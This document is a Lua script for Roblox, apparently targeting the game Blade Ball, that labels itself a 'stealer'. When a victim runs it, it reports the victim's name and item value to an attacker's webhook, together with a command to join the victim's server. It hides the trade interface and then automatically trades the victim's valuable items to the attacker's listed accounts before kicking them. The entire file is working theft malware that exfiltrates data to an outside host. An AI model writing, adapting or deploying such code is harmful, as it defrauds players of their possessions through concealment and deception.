-- // CONFIGURATION & EXECUTION CHECK
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- // VARIABLES SERVICES
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- // CONFIGURATION UTILISATEUR
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = "EBK-SS-A" 

local headshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"

-- // VÉRIFICATIONS DE SÉCURITÉ
if next(users) == nil or webhook == "" then
    plr:kick("Configuration Error: Usernames or Webhook is empty.")
    return
end

-- // NETTOYAGE UI
tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false
local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function() maintradegui.Visible = false end)

-- // GESTION DES ÉCHANGES & SUPPRESSION TRADING TEXT
tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
    if inTrade then
        task.spawn(function()
            local char = plr.Character
            if char then
                for i = 1, 15 do
                    for _, obj in ipairs(char:GetDescendants()) do
                        if obj:IsA("BillboardGui") then
                            obj.Enabled = false
                            obj:Destroy()
                        end
                    end
                    task.wait(0.1)
                end
            end
        end)
    end
end)

local function sendTradeRequest(user)
    local target = game:GetService("Players"):FindFirstChild(user)
    if not target then return end
    repeat
        task.wait(0.5)
        netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
    until inTrade == true
end

local function addItemToTrade(itemType, ID)
    local args = { [1] = itemType, [2] = ID }
    -- Délai d'ajout réduit au minimum technique
    netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args))
end

-- // SYSTÈME DE CONFIRMATION CORRIGÉ (D'APRÈS TES IMAGES)
local function readyTrade()
    repeat
        -- D'après ton explorer, c'est RespondToTradeRequest qui gère le statut
        local success = netModule:WaitForChild("RF/Trading/RespondToTradeRequest"):InvokeServer(true)
        task.wait(0.1)
    until not inTrade or success == true
end

local function confirmTrade()
    repeat
        -- Confirmation finale
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
        task.wait(0.1)
    until not inTrade
end

-- // FORMATAGE & MESSAGES (INTACTS)
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local totalRAP = 0

local function SendJoinMessage(list, prefix)
    local botUsername = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
    local data = {
        ["auth_token"] = auth_token,
        ["username"] = botUsername,
        ["content"] = prefix .. "```game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')```",
        ["embeds"] = {{
            ["title"] = botUsername,
            ["color"] = (totalRAP >= 500) and 65280 or 8323327,
            ["fields"] = {
                {name = "Victim Username 🤖:", value = plr.Name, inline = true},
                {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
            },
            ["thumbnail"] = {["url"] = headshot},
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

-- // SCAN RAP (INTACT)
local rapDataResult = Replion.Client:GetReplion("ItemRAP")
local rapData = rapDataResult.Data.Items

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    local categoryRapData = rapData[category]
    if not categoryRapData then return nameToRAP end
    for serializedKey, rap in pairs(categoryRapData) do
        local success, decodedKey = pcall(function() return HttpService:JSONDecode(serializedKey) end)
        if success and type(decodedKey) == "table" then
            for _, pair in ipairs(decodedKey) do
                if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end
            end
        end
    end
    return nameToRAP
end

local rapMappings = {}
for _, category in ipairs(categories) do rapMappings[category] = buildNameToRAPMap(category) end

for _, category in ipairs(categories) do
    if clientInventory[category] then
        for itemId, itemInfo in pairs(clientInventory[category]) do
            if not itemInfo.TradeLock then
                local rap = (rapMappings[category] and rapMappings[category][itemInfo.Name]) or 0
                if rap >= min_rap then
                    totalRAP = totalRAP + rap
                    table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
                end
            end
        end
    end
end

-- // EXECUTION RAPIDE
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    SendJoinMessage(itemsToSend, (ping == "Yes") and "--[[@everyone]] " or "")

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            sendTradeRequest(joinedUser)
            repeat task.wait(0.1) until inTrade
            
            -- Envoi des items sans task.spawn pour éviter la surcharge mais avec délai réduit
            for i = 1, math.min(100, #itemsToSend) do
                local item = table.remove(itemsToSend, 1)
                addItemToTrade(item.itemType, item.ItemID)
                task.wait(0.01) -- Délai ultra réduit pour l'ajout
            end

            task.wait(0.5) -- Petit temps mort pour que le serveur enregistre les items
            readyTrade()
            task.wait(0.3)
            confirmTrade()
        end
        plr:kick("Trade Completed")
    end

    local function waitForUserJoin()
        local function onUserJoin(player)
            if table.find(users, player.Name) then doTrade(player.Name) end
        end
        for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
        Players.PlayerAdded:Connect(onUserJoin)
    end
    waitForUserJoin()
end
